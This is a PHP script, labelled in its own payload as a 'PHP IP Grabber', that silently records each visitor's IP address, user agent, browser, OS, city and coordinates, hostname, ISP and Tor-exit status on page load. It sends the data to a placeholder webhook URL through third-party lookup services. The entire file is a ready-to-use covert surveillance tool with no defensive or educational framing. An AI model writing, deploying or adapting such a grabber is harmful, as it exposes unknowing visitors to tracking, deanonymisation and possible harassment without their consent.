$webhookurl = "WEBHOOK LINK";
class OS_BR{

    private $agent = "";
    private $info = array();

    function __construct(){
        $this->agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : NULL;
        $this->getBrowser();
        $this->getOS();
    }

    function getBrowser(){
        $browser = array("Navigator"            => "/Navigator(.*)/i",
                         "Firefox"              => "/Firefox(.*)/i",
                         "Internet Explorer"    => "/MSIE(.*)/i",
                         "Google Chrome"        => "/chrome(.*)/i",
                         "MAXTHON"              => "/MAXTHON(.*)/i",
                         "Opera"                => "/Opera(.*)/i",
                         );
        foreach($browser as $key => $value){
            if(preg_match($value, $this->agent)){
                $this->info = array_merge($this->info,array("Browser" => $key));
                $this->info = array_merge($this->info,array(
                  "Version" => $this->getVersion($key, $value, $this->agent)));
                break;
            }else{
                $this->info = array_merge($this->info,array("Browser" => "UnKnown"));
                $this->info = array_merge($this->info,array("Version" => "UnKnown"));
            }
        }
        return $this->info['Browser'];
    }

    function getOS(){
        $OS = array("Windows"   =>   "/Windows/i",
                    "Linux"     =>   "/Linux/i",
                    "Unix"      =>   "/Unix/i",
                    "Mac"       =>   "/Mac/i"
                    );

        foreach($OS as $key => $value){
            if(preg_match($value, $this->agent)){
                $this->info = array_merge($this->info,array("Operating System" => $key));
                break;
            }
        }
        return $this->info['Operating System'];
    }

    function getVersion($browser, $search, $string){
        $browser = $this->info['Browser'];
        $version = "";
        $browser = strtolower($browser);
        preg_match_all($search,$string,$match);
        switch($browser){
            case "firefox": $version = str_replace("/","",$match[1][0]);
            break;

            case "internet explorer": $version = substr($match[1][0],0,4);
            break;

            case "opera": $version = str_replace("/","",substr($match[1][0],0,5));
            break;

            case "navigator": $version = substr($match[1][0],1,7);
            break;

            case "maxthon": $version = str_replace(")","",$match[1][0]);
            break;

            case "google chrome": $version = substr($match[1][0],1,10);
        }
        return $version;
    }

    function showInfo($switch){
        $switch = strtolower($switch);
        switch($switch){
            case "browser": return $this->info['Browser'];
            break;

            case "os": return $this->info['Operating System'];
            break;

            case "version": return $this->info['Version'];
            break;

            case "all" : return array($this->info["Version"], 
              $this->info['Operating System'], $this->info['Browser']);
            break;

            default: return "Unkonw";
            break;

        }
    }
}
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
function useragent() {
  $useragent = '';
  if (isset($_SERVER['HTTP_USER_AGENT']))
      $useragent = $_SERVER['HTTP_USER_AGENT'];
  else
      $useragent='UNKNOWN';
  return $useragent;
}
function ip_location() {
  $ip = get_client_ip();
  $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
  $city = $details->city;
  $region = $details->region;
  $country = $details->country;
  $loc = $details->loc;
  return "`".$city . ", " . $region . ", " . $country . "`\n`" . $loc . "`";
}
function hostname() {
  $details = json_decode(file_get_contents("https://myip.wtf/json"));
  return "`" . $details->YourFuckingHostname . "`";
}
function isp() {
  $details = json_decode(file_get_contents("https://myip.wtf/json"));
  return "`" . $details->YourFuckingISP . "`";
}
function torexit() {
  $details = json_decode(file_get_contents("https://myip.wtf/json"));
  return "`" . $details->YourFuckingTorExit . "`";
}
function country() {
  $ip = get_client_ip();
  $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
  $country = $details->country;
  return "https://flagpedia.net/data/flags/w580/".strtolower($country).".png";
}
if (substr(get_client_ip(), 0, 4) == "172." or substr(get_client_ip(), 0, 3) == "10." or substr(get_client_ip(), 0, 8) == "192.168.") {
  return;
} else {
  $obj = new OS_BR();
  $timestamp = date("c", strtotime("now"));
  $json_data = json_encode([
      "content" => "",
      "username" => get_client_ip(),
      "avatar_url"=>"https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fpngimg.com%2Fuploads%2Fphp%2Fphp_PNG26.png",
      "embeds" => [
          [
              "type" => "rich",
              "timestamp" => $timestamp,
              "color" => hexdec( "3366ff" ),
              "author" => [
                  "name" => "seall.dev",
                  "url" => "https://seall.dev/"
              ],
              "title"=>"PHP IP Grabber",
              "thumbnail" => [
                           "url" => country()
              ],
              "fields" => [
                  [
                      "name" => "IP :globe_with_meridians:",
                      "value" => "`".get_client_ip()."`"
                  ],
                  [
                      "name" => "User Agent :bust_in_silhouette:",
                      "value" => "`".useragent()."`"
                  ],
                  [
                      "name" => "Browser/OS :floppy_disk:",
                      "value" => "`".$obj->showInfo('browser') . "` `" . $obj->showInfo('version') . "` `" . $obj->showInfo('os')."`"
                  ],
                  [
                      "name" => "Location :map:",
                      "value" => ip_location()
                  ],
                  [
                      "name" => "Hostname :name_badge:",
                      "value" => hostname()
                  ],
                  [
                      "name" => "ISP :classical_building:",
                      "value" => isp()
                  ],
                  [
                      "name" => "Tor Exit :onion:",
                      "value" => torexit()
                  ]
              ]
          ]
          
      ]
  
  ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
  
  $ch = curl_init( $webhookurl );
  curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
  curl_setopt( $ch, CURLOPT_POST, 1);
  curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
  curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt( $ch, CURLOPT_HEADER, 0);
  curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
  $response = curl_exec( $ch );
  curl_close( $ch );
}